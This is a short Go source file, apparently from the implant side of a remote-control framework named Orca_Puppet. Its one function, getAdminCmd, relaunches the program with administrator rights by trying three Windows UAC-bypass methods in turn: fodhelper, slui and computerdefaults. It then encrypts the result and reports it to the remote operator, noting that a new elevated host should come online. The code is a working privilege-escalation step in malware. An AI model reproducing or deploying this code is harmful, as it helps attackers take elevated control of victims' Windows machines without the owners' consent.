package controller

import (
	"Orca_Puppet/cli/common"
	"Orca_Puppet/define/colorcode"
	"Orca_Puppet/define/config"
	"Orca_Puppet/pkg/bypassuac"
	"Orca_Puppet/tools/crypto"
	"Orca_Puppet/tools/util"
	"fmt"
	"os"
	"strings"
)

func getAdminCmd(sendUserId string) {
	path, err := util.GetExecPath()
	fmt.Println(path)
	args := strings.Join(os.Args[1:], " ")
	cmd := fmt.Sprintf("%s %s", path, args)
	if err != nil {
		return
	}
	err = bypassuac.ExecFodhelper(cmd)
	if err != nil {
		err = bypassuac.ExecSlui(cmd)
		if err != nil {
			err = bypassuac.ExecComputerdefaults(cmd)
			if err != nil {
				data := colorcode.OutputMessage(colorcode.SIGN_FAIL, "failed to obtain administrator privileges")
				outputMsg, _ := crypto.Encrypt([]byte(data), []byte(config.AesKey))
				common.SendFailMsg(sendUserId, common.ClientId, "getAdmin_ret", outputMsg)
				return
			}
		}
	}
	data := colorcode.OutputMessage(colorcode.SIGN_SUCCESS, "successfully obtained administrator privileges, please check whether a new host is online")
	outputMsg, _ := crypto.Encrypt([]byte(data), []byte(config.AesKey))
	common.SendSuccessMsg(sendUserId, common.ClientId, "getAdmin_ret", outputMsg)
}
